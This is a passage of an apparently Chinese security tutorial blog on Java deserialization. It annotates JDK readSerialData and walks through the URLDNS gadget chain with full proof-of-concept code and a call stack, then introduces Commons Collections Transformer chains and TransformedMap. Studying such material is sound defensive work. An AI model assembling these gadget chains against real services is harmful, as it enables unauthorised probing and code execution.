处理“发送端类层级与接收端不一致”的兼容场景。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 类层级布局（父 → 子）</span></span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">slotDesc</span> <span class="operator">=</span> slots[i].desc;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (slots[i].hasData) &#123; <span class="comment">// 该层在流里有数据</span></span><br><span class="line">            <span class="comment">// 若对象不可用（本地类缺失 → obj==null）或此前已在该句柄上记录异常，</span></span><br><span class="line">            <span class="comment">// 则仅消费/跳过该层字段的字节，不尝试填充对象字段。</span></span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="literal">null</span> || handles.lookupException(passHandle) != <span class="literal">null</span>) &#123;</span><br><span class="line">                defaultReadFields(<span class="literal">null</span>, slotDesc); <span class="comment">// 跳过字段值</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 自定义 readObject 路径</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (slotDesc.hasReadObjectMethod()) &#123;</span><br><span class="line">                <span class="type">ThreadDeath</span> <span class="variable">t</span> <span class="operator">=</span> <span class="literal">null</span>;       <span class="comment">// 若 finally 恢复上下文时遇到 ThreadDeath，延后再抛</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">reset</span> <span class="operator">=</span> <span class="literal">false</span>;      <span class="comment">// 直到上下文成功复位为止</span></span><br><span class="line">                <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line">                <span class="keyword">if</span> (oldContext != <span class="literal">null</span>)</span><br><span class="line">                    oldContext.check();     <span class="comment">// 外层上下文合法性检查（未被重复使用）</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 为该层建立新的“反序列化回调上下文”，允许 defaultReadObject/readFields 合法调用</span></span><br><span class="line">                    curContext = <span class="keyword">new</span> <span class="title class_">SerialCallbackContext</span>(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 按协议：readObject 的自定义数据以 Block-Data 写入，需进入块模式读取</span></span><br><span class="line">                    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 反射调用类的私有 readObject(ObjectInputStream)</span></span><br><span class="line">                    slotDesc.invokeReadObject(obj, <span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * 大多数情况下，句柄表已把 CNF 传播到 passHandle；</span></span><br><span class="line"><span class="comment">                     * 若 readObject 内部“新构造并抛出了”一个 CNF，这里补记到句柄上。</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    handles.markException(passHandle, ex);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="comment">// 恢复回调上下文（必须保证恢复成功；若中途遇到 ThreadDeath，等 reset 完成后再抛）</span></span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            curContext.setUsed(); <span class="comment">// 标记本层上下文已使用完毕，禁止后续再用</span></span><br><span class="line">                            <span class="keyword">if</span> (oldContext != <span class="literal">null</span>)</span><br><span class="line">                                oldContext.check();</span><br><span class="line">                            curContext = oldContext;</span><br><span class="line">                            reset = <span class="literal">true</span>;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ThreadDeath x) &#123;</span><br><span class="line">                            t = x; <span class="comment">// 暂存，直到 reset==true</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">while</span> (!reset);</span><br><span class="line">                    <span class="keyword">if</span> (t != <span class="literal">null</span>)</span><br><span class="line">                        <span class="keyword">throw</span> t;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * 若自定义 readObject 期间调用了 defaultReadObject()/readFields()，</span></span><br><span class="line"><span class="comment">                 * 可能间接把 defaultDataEnd 置为 true（表示“默认字段块已到末尾，但旧协议无显式 ENDBLOCKDATA”）。</span></span><br><span class="line"><span class="comment">                 * 这里复位为 false，恢复正常读取行为。</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                defaultDataEnd = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 默认字段读取路径</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                defaultReadFields(obj, slotDesc);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取完该层后，若类定义了 writeObject（意味着写端在该层还写了“自定义数据块”），</span></span><br><span class="line">            <span class="comment">// 则需把那段 Block-Data 吞掉至 TC_ENDBLOCKDATA；否则直接退出块模式。</span></span><br><span class="line">            <span class="keyword">if</span> (slotDesc.hasWriteObjectData()) &#123;</span><br><span class="line">                skipCustomData();          <span class="comment">// 读尽自定义块并切回非块模式</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// slots[i].hasData == false：该层在流中无数据（层级不匹配等）</span></span><br><span class="line">            <span class="comment">// 若对象有效、未记录异常、该层声明了 readObjectNoData()，则调用之以处理兼容初始化</span></span><br><span class="line">            <span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                slotDesc.hasReadObjectNoDataMethod() &amp;&amp;</span><br><span class="line">                handles.lookupException(passHandle) == <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                slotDesc.invokeReadObjectNoData(obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="反序列化利用（URLDNS-为例）"><a href="#反序列化利用（URLDNS-为例）" class="headerlink" title="反序列化利用（URLDNS 为例）"></a>反序列化利用（URLDNS 为例）</h2><p>URLDNS 反序列化利用链可以通过 DNS 请求来验证反序列化漏洞的可利用性。这条利用链使用 Java 内置的类构造，对第三方库没有依赖，可以在没有回显的情况下验证是否存在反序列化漏洞。我们可以在 <a class="link"   target="_blank" rel="noopener" href="https://requestrepo.com/" >https://requestrepo.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 网站上进行 DNS 请求测试。</p>
<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://www.example.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(url, <span class="string">&quot;hashCode&quot;</span>, <span class="number">0xdeadbeef</span>); <span class="comment">// 防止提前触发影响观察现象</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line">        setFieldValue(url, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getHostAddress:436, URLStreamHandler (java.net)</span><br><span class="line">hashCode:353, URLStreamHandler (java.net)</span><br><span class="line">hashCode:878, URL (java.net)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br></pre></td></tr></table></figure></div>

<p>首先在 <code>HashMap.readObject</code> 中会遍历 <code>HashMap</code> 的成员并对 <code>key</code> 调用 <code>HashMap.hash</code> 函数计算 hash。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 读取阈值（被忽略）、加载因子以及其他隐藏的内容</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// 重新初始化HashMap</span></span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="comment">// 检查加载因子是否有效</span></span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取并忽略桶的数量</span></span><br><span class="line">    s.readInt();</span><br><span class="line">    <span class="comment">// 读取映射的数量（即HashMap的大小）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="comment">// 检查映射数量是否有效</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// 如果映射数量大于零，则进行初始化</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// 读取键和值，并将映射放入HashMap中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject(); <span class="comment">// 读取键对象</span></span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject(); <span class="comment">// 读取值对象</span></span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>); <span class="comment">// &lt;-- 调用hash函数并插入键值对</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>HashMap#hash</code> 函数中会调用 <code>key</code> 的 <code>hashCode</code> 方法，也就是 <code>URL#hashCode</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>URL.hashCode</code> 函数中，由于我们设置 <code>url</code> 对象的 <code>hashCode</code> 成员值为 -1，因此会调用 <code>URLStreamHandler#hashCode</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>URLStreamHandler#hashCode</code> 函数会调用 <code>getHostAddress</code> 函数获取 URL 对应的  ip 地址，也就会发送 DNS 请求。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="CommonCollections-系列"><a href="#CommonCollections-系列" class="headerlink" title="CommonCollections 系列"></a>CommonCollections 系列</h1><h2 id="Commons-Collections-概述"><a href="#Commons-Collections-概述" class="headerlink" title="Commons Collections 概述"></a>Commons Collections 概述</h2><p>Apache Commons Collections 是⼀个著名的辅助开发库，包含了一些 Java 中没有的数据结构和和辅助方法，不过随着 Java 9 以后的版本中原生库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。</p>
<p>在 2015 年底 commons-collections 反序列化利用链被提出时，Apache Commons Collections 有以下两个分支版本：</p>
<ul>
<li><code>commons-collections:commons-collections</code></li>
<li><code>org.apache.commons:commons-collections4</code></li>
</ul>
<p>前者是 Commons Collections 老的版本包，当时版本号是 3.2.1；后者是官方在 2013 年推出的 4 版本，当时版本号是 4.0。</p>
<p>因为官方认为旧的 commons-collections 有⼀些架构和 API 设计上的问题，但修复这些问题，会产生大量不能向前兼容的改动。所以，commons-collections4 不再认为是一个用来替换 commons-collections 的新版本，而是一个新的包，两者的命名空间不冲突，因此可以共存在同一个项目中。</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons/collections --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons/collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p><code>Transformer</code> 是一个接口，具体代码如下，可以看到这个接口只有一个 <code>transform</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Transformer</code> 可以说是 CC 链的核心，<del>几乎</del>所有的 CC 链都依赖于 <code>Transformer</code>。我们可以简单的把 CC 链总结为：<strong>寻找一个类，这个类自定义的 <code>readObject</code> 方法会直接或间接的触发对指定 <code>Transformer</code> 对象调用 <code>transform</code> 方法的代码。</strong></p>
<p>由于我们可以用一系列 <code>Transformer</code> 接口实现类实现代码执行流的完全控制，因此当调用 <code>transform</code> 方法的时候，就可以执行我们的恶意代码。</p>
<h3 id="调用-transform-方法的对象"><a href="#调用-transform-方法的对象" class="headerlink" title="调用 transform 方法的对象"></a>调用 transform 方法的对象</h3><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p><code>TransformedMap</code> 用于对 Java 标准数据结构 Map 做一个修饰，被修饰过的 <code>Map</code> 在添加（写入操作）新的元素时，将可以执行一个回调。我们通过下面这行代码对 <code>innerMap</code> 进行修饰，传出的 <code>outerMap</code> 即是修饰后的 <code>Map</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure></div>

<p><code>TransformedMap#decorate</code> 函数是一个工厂方法，该方法会实例化一个 <code>TransformedMap</code> 对象，并且根据参数设置 <code>keyTransformer</code> 和 <code>valueTransformer</code> 成员。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造方法：对传入的 Map 进行包装（**不复制已有内容**）。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 注意：如果原始 Map 中已经存在元素，它们**不会被转换**。</span></span><br><span class="line"><span class="comment"> * 只有在后续执行 put/putAll 操作时，key/value 才会通过转换器进行处理。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map               要包装的原始 Map，不能为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer    用于 key 转换的转换器（Transformer），null 表示不进行转换</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  用于 value 转换的转换器（Transformer），null 表示不进行转换</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 如果 map 为 null，则抛出异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="comment">// 使用父类构造器包装原始 Map</span></span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="comment">// 保存转换器（可为 null，表示不转换）</span></span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 工厂方法：创建一个 **可转换的 Map（TransformedMap）**。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 注意：被包装的原始 Map 中**已有的元素不会被转换**。</span></span><br><span class="line"><span class="comment"> * 如果需要对现有数据也进行转换，请使用 &#123;<span class="doctag">@link</span> #decorateTransform&#125; 方法。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map               要包装的原始 Map，不能为空</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer    用于转换 key 的转换器（Transformer），为 null 表示不转换 key</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  用于转换 value 的转换器（Transformer），为 null 表示不转换 value</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>                  被转换器包装后的 TransformedMap 实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 如果 map 为 null，则抛出异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>另外 <code>TransformedMap</code> 构造函数还会调用父类构造函数，而 <code>TransformedMap</code> 有如下继承关系：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/09/09/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/images/TransformedMap.png"
                      alt="TransformedMap"
                ></p>
<p>其中在 <code>AbstractMapDecorator</code> 的构造函数中会设置 <code>map</code> 成员，也就是保存被修饰的 <code>Map</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造方法：对传入的 Map 进行包装（**不复制内容**）。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 注意：此构造器不会创建 Map 的副本，而是直接持有原始 Map 的引用。</span></span><br><span class="line"><span class="comment"> * 对原始 Map 的修改会影响到该装饰器对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  需要被包装的 